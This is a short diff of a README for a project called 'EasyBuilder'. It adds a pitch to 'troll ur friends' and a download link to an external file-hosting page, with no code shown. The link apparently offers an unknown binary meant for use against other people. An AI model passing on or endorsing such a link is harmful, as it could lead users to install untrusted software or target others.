@@ -1,2 +1,4 @@
 # EasyBuilder
-A builder for trolling your friends !
+
+## Want to troll ur friends ? 
+> Download here : https://gofile.io/d/gh3mVbyu
